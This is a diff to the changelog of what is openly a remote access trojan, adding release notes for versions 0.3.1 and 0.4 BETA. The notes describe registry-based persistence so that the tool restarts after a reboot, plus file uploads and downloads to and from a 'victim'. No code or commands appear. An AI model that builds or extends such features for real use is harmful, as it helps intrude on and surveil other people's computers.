@@ -1,4 +1,11 @@
 --------------------------------------------------------------
+0.4 BETA 
+- Added self-startup for RAT, now it is able to start after PC boot (new registry key)
+--------------------------------------------------------------
+0.3.1 BETA 
+- Refactored file upload feature (simplified, not it requires no "-s"(size) option) + added more output
+- Memory leak and allocation fixes for file uploads/downloads
+--------------------------------------------------------------
 0.3 BETA 
 - Added file upload option (from client to victim)
 --------------------------------------------------------------
